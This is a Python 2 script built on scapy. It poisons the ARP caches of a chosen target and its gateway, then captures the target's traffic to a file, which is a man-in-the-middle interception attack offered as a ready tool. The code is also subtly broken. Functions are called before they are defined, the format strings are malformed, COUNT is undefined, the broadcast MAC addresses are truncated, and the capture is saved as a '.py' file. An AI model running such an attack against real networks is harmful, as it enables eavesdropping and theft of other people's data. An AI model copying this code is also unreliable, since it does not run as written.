__author__ = 'n4rut0'

from scapy.all import *
import sys
import threading

interface = raw_input("[*] Enter interface : ")
target_ip = raw_input("[*] Enter IP target : ")
gateway = raw_input("[*] Enter IP gateway : ")

target_mac = get_mac(target_ip)
if target_mac is None:
    print "!!!! Failed to access mac address"
else:
    print "[*] Mac address of % is %" % (target_ip,target_mac)
    
gateway_mac = get_mac(gateway)
if gateway_mac is None:
    print "!!!! Failed to access mac address"
else:
    print "[*] Mac address of % is % "% (gateway,gateway_mac)
    
poison_thread = threading.Thread(target=poison_target, args = (target_ip,target_mac,gateway,gateway_mac))
poison_thread.start()

try:
    filtering = "ip host %" %(target_ip)
    pkts = sniff(count=COUNT, lfilter=filtering, iface=interface)
    
    wrpcap("arporca.py", pkts)
    
    restore_target(target_ip,target_mac,gateway,gateway_mac)
except KeyboardInterrupt:
    restore_target(target_ip,target_mac,gateway,gateway_mac)
    sys.exit()
    
def poison_target(target_ip,target_mac,gateway,gateway_mac):
    
    poison_target = ARP()
    poison_target.pdst = target_ip
    poison_target.psrc = gateway
    poison_target.hwdst = target_mac
    poison_target.op = 2
    
    poison_gateway = ARP()
    poison_gateway.pdst = gateway
    poison_gateway.psrc = target_ip
    poison_gateway.hwdst = gateway_mac
    poison_gateway.op = 2
    

    print "[*] Begining send arp poisoning...."

    try:
        send(poison_target)
        send(poison_gateway)
    
        time.sleep(2)    
    except KeyboardInterrupt:
        restore_target(target_ip,target_mac,gateway,gateway_mac)
    
    print "[*] Arp poisoning has finished."
    return

def restore_target(target_ip,target_mac,gateway,gateway_mac):
    print "[*] Restoring network target..."
    
    send(ARP(op=2,psrc=target_ip,pdst=gateway,hwdst="ff:ff:ff:ff:ff",hwsrc=target_mac),count=5)
    send(ARP(op=2,psrc=gateway,pdst=target_ip,hwdst="ff:ff:ff:ff:ff",hwsrc=gateway_mac),count=5)
    os.kill(os.getpid(), signal.SIGINT)

def get_mac(ipaddr):
    response, answer = srp(Ether(dst="ff:ff:ff:ff:ff")/ARP(pdst=ipaddr),timeout=2,retry=10)
    
    for s,r in response:
        return r[Ether].src
        
        return None
    
    
    
    
    
